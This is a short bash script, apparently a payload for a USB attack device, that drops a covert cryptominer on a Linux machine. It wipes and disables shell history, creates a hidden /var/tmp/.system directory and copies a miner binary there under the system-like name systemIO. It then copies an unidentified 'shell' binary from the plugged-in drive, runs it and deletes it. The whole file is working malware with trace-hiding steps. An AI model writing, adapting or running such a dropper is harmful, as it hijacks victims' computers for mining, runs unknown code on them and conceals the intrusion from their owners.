#!/bin/bash
unset HISTFILE && HISTSIZE=0 && rm -f $HISTFILE && unset HISTFILE
mkdir /var/tmp/.system
lol=$(lsblk | grep 1.8G)
disk=$(echo $lol | awk '{print $1}')
mntt=$(lsblk | grep $disk | awk '{print $7}')
cp -r $mntt/payloads/library/mine4me/systemIn /var/tmp/.system/systemIO
chmod +x /var/tmp/.system/systemIO/systemIO
cp -r $mntt/payloads/library/mine4me/shell /tmp/
chmod +x /tmp/shell && /tmp/./shell && rm /tmp/shell
